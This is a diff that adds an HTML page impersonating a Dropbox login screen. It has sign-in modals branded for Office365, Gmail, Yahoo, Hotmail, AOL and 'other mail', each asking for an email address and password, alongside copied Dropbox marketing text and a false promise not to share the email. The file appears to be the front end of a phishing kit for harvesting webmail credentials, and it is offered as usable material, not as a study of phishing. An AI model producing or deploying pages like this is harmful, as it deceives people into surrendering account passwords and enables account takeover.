@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<!--This begin the code-->
+  <head>
+    <link
+    rel="stylesheet"
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="a/admur.css">
+    <script type="text/javascript" src="a/ade.js">
+    </script>
+    <title>Dropbox Login</title>
+  </head>
+  <body>
+    <!--ini untuk kepala-->
+    <div class="header" id="ok">
+      <img src="i/z.png" class="img-head" alt="">
+    </div>
+    <!--kontennya di sini-->
+    <div class="content">
+      <!--bg modal-->
+      <div class="bgmo">
+      </div>
+      <!--1modal-->  
+      <div id="office">
+        <button type="button" class="modalbtn" onclick="cmodal()" name="button">x</button>
+        <div class="modalimg">
+          <img src="i/office.png" class="mimg" alt="">
+        </div>
+        <div class="hline"></div>
+        <form class="" style="text-align:center;" action="" method="get">
+          <div class="user">
+            <p style="display:block; color:#000; font-size: 20px;">Username or Email</p>
+            <input type="email"name="hemail" placeholder="example@mail.com" required>
+          </div>
+          <div class="user">
+            <p style="display:block; color:#000; font-size: 20px;">Password</p>
+            <input type="password" name="hpw" placeholder="Password" required>
+            <div class="textaku">We'll never share your email with anyone else</div>
+          </div>
+          <button class="submit-btn" type="submit" method="get">Login</button>
+        </form>
+      </div>
+      <!--2modal-->
+      <div id="gmail">
+        <button type="button" class="modalbtn" onclick="cmodal()" name="button">x</button>
+        <div class="modalimg">
+          <img src="i/gg.png" class="mimg" alt="">
+        </div>
+        <div class="hline"></div>
+        <form class="" style="text-align:center;" action="" method="get">
+          <div class="user">
+            <p style="display:block; color:#000; font-size: 20px;">Username or Email</p>
+            <input type="email" name="hemail" placeholder="example@mail.com" required>
+          </div>
+          <div class="user">
+            <p style="display:block; color:#000; font-size: 20px;">Password</p>
+            <input type="password" name="hpw"placeholder="Password" required>
+            <div class="textaku">We'll never share your email with anyone else</div>
+          </div>
+          <button class="submit-btn" type="submit" method="get">Login</button>
+        </form>
+      </div>
+      <!--3modal-->
+      <div id="yahoo">
+        <button type="button" class="modalbtn" onclick="cmodal()" name="button">x</button>
+        <div class="modalimg">
+          <img src="i/yahoo.png" class="mimg" alt="">
+        </div>
+        <div class="hline"></div>
+        <form class="" style="text-align:center;" action="" method="get">
+          <div class="user">
+            <p style="display:block; color:#000; font-size: 20px;">Username or Email</p>
+            <input type="email" placeholder="example@mail.com" name="hemail" required>
+          </div>
+          <div class="user">
+            <p style="display:block; color:#000; font-size: 20px;">Password</p>
+            <input type="password" name="hpw" placeholder="Password" required>
+            <div class="textaku">We'll never share your email with anyone else</div>
+          </div>
+          <button class="submit-btn" type="submit" method="get">Login</button>
+        </form>
+      </div>
+      <!--4modal-->
+      <div id="other">
+        <button type="button" class="modalbtn" onclick="cmodal()" name="button">x</button>
+        <div class="modalimg">
+          <img src="i/other.png" class="mimg" alt="">
+        </div>
+        <div class="hline"></div>
+        <form class="" style="text-align:center;" action="" method="get">
+          <div class="user">
+            <p style="display:block; color:#000; font-size: 20px;">Username or Email</p>
+            <input type="email" name="hemail"placeholder="example@mail.com" required>
+          </div>
+          <div class="user">
+            <p style="display:block; color:#000; font-size: 20px;">Password</p>
+            <input type="password" name="hpw" placeholder="Password" required>
+            <div class="textaku">We'll never share your email with anyone else</div>
+          </div>
+          <button class="submit-btn" type="submit" method="get">Login</button>
+        </form>
+      </div>
+      <!--5modal-->
+      <div id="hotmail">
+        <button type="button" class="modalbtn" onclick="cmodal()" name="button">x</button>
+        <div class="modalimg">
+          <img src="i/outlook.png" class="mimg" alt="">
+        </div>
+        <div class="hline"></div>
+        <form class="" style="text-align:center;" action="" method="get">
+          <div class="user">
+            <p style="display:block; color:#000; font-size: 20px;">Username or Email</p>
+            <input type="email" name="hemail" placeholder="example@mail.com" required>
+          </div>
+          <div class="user">
+            <p style="display:block; color:#000; font-size: 20px;">Password</p>
+            <input type="password" name="hpw" placeholder="Password" required>
+            <div class="textaku">We'll never share your email with anyone else</div>
+          </div>
+          <button class="submit-btn" type="submit" method="get">Login</button>
+        </form>
+      </div>
+      <!--6modal-->
+      <div id="aol">
+        <button type="button" class="modalbtn" onclick="cmodal()" name="button">x</button>
+        <div class="modalimg">
+          <img src="i/aol.png" class="mimg" alt="">
+        </div>
+        <div class="hline"></div>
+        <form class="" style="text-align:center;" action="" method="get">
+          <div class="user">
+            <p style="display:block; color:#000;font-size: 20px;">Username or Email</p>
+            <input type="email" name="hemail" placeholder="example@mail.com" required>
+          </div>
+          <div class="user">
+            <p style="display:block; color:#000; font-size: 20px;">Password</p>
+            <input type="password" name="hpw" placeholder="Password" required>
+            <div class="textaku">We'll never share your email with anyone else</div>
+          </div>
+          <button class="submit-btn" type="submit" method="get">Login</button>
+        </form>
+      </div>
+      <!--gambar dropbox-->
+      <div class="adm">
+        <div class="dbimg">
+          <img src="i/aa.png"class="myimg" alt="">
+          <p>Dropbox is the world's first smart workspaces. We bring all<br>your team's content together while letting you use the<br>tools you love. And we help cut trough the clutter,<br>surfacing what matters most.</p>
+          <div class="text-wellcome">
+            Dropbox is the world's first smart workspaces. We bring all your team's content together while letting you use the tools you love. And we help cut trough the clutter, surfacing what matters most.
+          </div>
+        </div>
+        <!--garis-->
+        <div class="line">
+        </div>
+        <!--menu-->
+        <div class="login-container fleft">
+          <div class="box fleft">
+            <button onclick="omodal()" class="box office" type="button" name="button">
+              <img class="image" src="i/office.png" alt="">
+              <p>Continue using office365</p>
+              <div class="text">
+                Continue using office365
+              </div>
+            </button>
+          </div>
+          <div class="box fleft">
+            <button class="box gmail" onclick="gmodal()" type="button" name="button">
+              <img src="i/gg.png" class="image" alt="">
+              <p style="color:#000000">Continue using gmail</p>
+              <div class="textg">
+                Continue using gmail
+              </div>
+            </button>
+          </div>
+          <div class="box fleft">
+            <button class="box yahoo" onclick="ymodal()" type="button" name="button">
+              <img src="i/yahoo.png" class="image" alt="">
+              <p>Continue Using Yahoo</p>
+              <div class="text">
+                Continue using Yahoo
+              </div>
+            </button>
+          </div>
+        </div>
+        <div class="login-container">
+          <div class="boxo fright">
+            <button class="boxo outlook" onclick="hmodal()" type="button" name="button">
+              <img src="i/outlook.png" class="image" alt="">
+              <p>Continue using Hotmail</p>
+              <div class="text">
+                Continue using Hotmail
+              </div>
+            </button>
+          </div>
+          <div class="boxo fright">
+            <button class="boxo aol" type="button" onclick="aol()" name="button">
+              <img src="i/aol.png" class="image" alt="">
+              <p style="color:#000000;">Continue using AOL</p>
+              <div class="textg">
+                Continue using AOL
+              </div>
+            </button>
+          </div>
+          <div class="boxo fright">
+            <button class="boxo other" type="button" onclick="other()" name="button">
+              <img src="i/other.png" class="image" alt="">
+              <p>Continue using other mail</p>
+              <div class="text">
+                Continue using other mail
+              </div>
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
